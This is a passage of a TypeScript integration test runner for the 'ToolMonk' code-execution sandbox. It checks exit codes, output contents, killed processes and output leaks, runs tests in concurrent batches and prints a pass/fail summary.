        const preview = combined.slice(0, 300).replace(/\n/g, "↵");
        return {
          passed: false,
          reason: `SECURITY LEAK: compile output contains "${assert.secureNotContains}". Got: "${preview}"`,
        };
      }
    }
    return { passed: true };
  }

  const run = body.run;

  // killed (signal) — checked first but secureNotContains always runs after
  if (assert.killed) {
    if (!run.signal) {
      return {
        passed: false,
        reason: `Expected process to be killed (signal), but signal=${run.signal}, code=${run.code}`,
      };
    }
    // fall through to secureNotContains check below
  }

  // generic failure (non-zero exit OR signal)
  else if (assert.failure) {
    if (run.code === 0 && !run.signal) {
      return {
        passed: false,
        reason: `Expected failure but exited with code 0`,
      };
    }
    // fall through to secureNotContains check below
  }

  else {
    // exit code
    if (assert.exitCode !== undefined) {
      if (run.code !== assert.exitCode) {
        return {
          passed: false,
          reason: `Expected exitCode=${assert.exitCode}, got ${run.code} (signal=${run.signal})`,
        };
      }
    }

    // stdout contains
    if (assert.stdoutContains !== undefined) {
      if (!run.stdout.includes(assert.stdoutContains)) {
        const preview = run.stdout.slice(0, 200).replace(/\n/g, "↵");
        return {
          passed: false,
          reason: `stdout does not contain "${assert.stdoutContains}". Got: "${preview}"`,
        };
      }
    }

    // stdout exact (trimmed)
    if (assert.stdoutExact !== undefined) {
      const actual = run.stdout.trim();
      if (actual !== assert.stdoutExact) {
        return {
          passed: false,
          reason: `stdout exact mismatch. Expected: "${assert.stdoutExact}", got: "${actual}"`,
        };
      }
    }

    // stderr contains
    if (assert.stderrContains !== undefined) {
      const combinedStderr = (run.stderr + (body.compile?.stderr ?? ""));
      if (!combinedStderr.includes(assert.stderrContains)) {
        const preview = combinedStderr.slice(0, 200).replace(/\n/g, "↵");
        return {
          passed: false,
          reason: `stderr does not contain "${assert.stderrContains}". Got: "${preview}"`,
        };
      }
    }
  }

  // secureNotContains — always evaluated last, regardless of killed/failure.
  // Checks run output AND compile output (compile errors can also leak paths).
  if (assert.secureNotContains !== undefined) {
    const combined = (
      run.stdout + run.stderr +
      (body.compile?.stdout ?? "") + (body.compile?.stderr ?? "")
    ).toLowerCase();
    if (combined.includes(assert.secureNotContains.toLowerCase())) {
      const preview = combined.slice(0, 300).replace(/\n/g, "↵");
      return {
        passed: false,
        reason: `SECURITY LEAK: output contains "${assert.secureNotContains}". Got: "${preview}"`,
      };
    }
  }

  return { passed: true };
}

// ── Test runner ────────────────────────────────────────────────────────────────

interface Result {
  test:     TestCase;
  passed:   boolean;
  skipped:  boolean;
  reason?:  string;
  durationMs: number;
}

async function runTest(test: TestCase): Promise<Result> {
  if (test.skip) {
    return { test, passed: true, skipped: true, durationMs: 0 };
  }

  const start = Date.now();
  try {
    const resp = await callRunner(test.lang, test.code, test.stdin ?? "");
    const check = checkAssertions(resp, test.assert);
    return {
      test,
      passed:     check.passed,
      skipped:    false,
      reason:     check.reason,
      durationMs: Date.now() - start,
    };
  } catch (e) {
    return {
      test,
      passed:     false,
      skipped:    false,
      reason:     e instanceof Error ? e.message : String(e),
      durationMs: Date.now() - start,
    };
  }
}

// ── CLI args ───────────────────────────────────────────────────────────────────

function parseArgs() {
  const args = process.argv.slice(2);
  let langFilter: string | undefined;
  let nameFilter: string | undefined;
  let concurrency = 4; // run N tests in parallel

  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--lang" && args[i + 1]) langFilter = args[++i];
    if (args[i] === "--filter" && args[i + 1]) nameFilter = args[++i];
    if (args[i] === "--concurrency" && args[i + 1]) concurrency = parseInt(args[++i], 10);
  }

  return { langFilter, nameFilter, concurrency };
}

// ── Main ───────────────────────────────────────────────────────────────────────

async function main() {
  const { langFilter, nameFilter, concurrency } = parseArgs();

  console.log(`\n${c.bold}ToolMonk Runner Integration Tests${c.reset}`);
  console.log(`${c.gray}Target: ${RUNNER_URL}${c.reset}\n`);

  // Check runner is up
  try {
    const health = await fetch(`${RUNNER_URL}/health`, { signal: AbortSignal.timeout(5000) });
    const data = await health.json() as { ok: boolean; cgMode: string; poolSize: number };
    console.log(`${c.green}Runner online${c.reset}  cgMode=${data.cgMode}  poolSize=${data.poolSize}\n`);
  } catch {
    console.error(`${c.red}${c.bold}ERROR: Runner not reachable at ${RUNNER_URL}${c.reset}`);
    console.error(`Start it first:  make local-up`);
    process.exit(1);
  }

  // Filter tests
  let tests = TESTS;
  if (langFilter) tests = tests.filter(t => t.lang === langFilter || t.lang.startsWith(langFilter));
  if (nameFilter) tests = tests.filter(t => t.name.includes(nameFilter));

  console.log(`Running ${c.bold}${tests.length}${c.reset} tests (concurrency=${concurrency})\n`);

  // Group by language for display
  const langGroups = new Map<string, TestCase[]>();
  for (const t of tests) {
    const key = t.lang;
    if (!langGroups.has(key)) langGroups.set(key, []);
    langGroups.get(key)!.push(t);
  }

  const allResults: Result[] = [];

  // Run concurrently in batches
  for (const [lang, langTests] of langGroups) {
    console.log(`${c.cyan}${c.bold}${lang.toUpperCase()}${c.reset}`);

    for (let i = 0; i < langTests.length; i += concurrency) {
      const batch = langTests.slice(i, i + concurrency);
      const batchResults = await Promise.all(batch.map(runTest));

      for (const result of batchResults) {
        allResults.push(result);
        const icon = result.skipped ? skip : result.passed ? pass : fail;
        const duration = result.skipped ? "" : `${c.gray}(${result.durationMs}ms)${c.reset}`;
        const label = result.test.name.replace(`${lang} / `, "");
        console.log(`  ${icon} ${label} ${duration}`);
        if (!result.passed && result.reason) {
          console.log(`     ${c.red}${result.reason}${c.reset}`);
        }
      }
    }
    console.log();
  }

  // Summary
  const passed  = allResults.filter(r => r.passed && !r.skipped).length;
  const failed  = allResults.filter(r => !r.passed).length;
  const skipped = allResults.filter(r => r.skipped).length;
  const total   = allResults.length;
  const totalMs = allResults.reduce((s, r) => s + r.durationMs, 0);

  console.log("─".repeat(50));
  if (failed === 0) {
    console.log(`${c.green}${c.bold}All ${passed} tests passed${c.reset}  ${c.gray}${skipped > 0 ? `(${skipped} skipped)  ` : ""}${totalMs}ms${c.reset}`);
  } else {
    console.log(
      `${c.green}${passed} passed${c.reset}  ` +
      `${c.red}${c.bold}${failed} failed${c.reset}  ` +
      `${skipped > 0 ? `${c.yellow}${skipped} skipped${c.reset}  ` : ""}` +
      `${c.gray}${totalMs}ms  ${total} total${c.reset}`
    );

    console.log(`\n${c.red}${c.bold}Failed tests:${c.reset}`);
    for (const r of allResults.filter(r => !r.passed)) {
      console.log(`  ${fail} ${r.test.name}`);
      if (r.reason) console.log(`     ${c.red}${r.reason}${c.reset}`);
    }
  }

  console.log();
  process.exit(failed > 0 ? 1 : 0);
}

main();
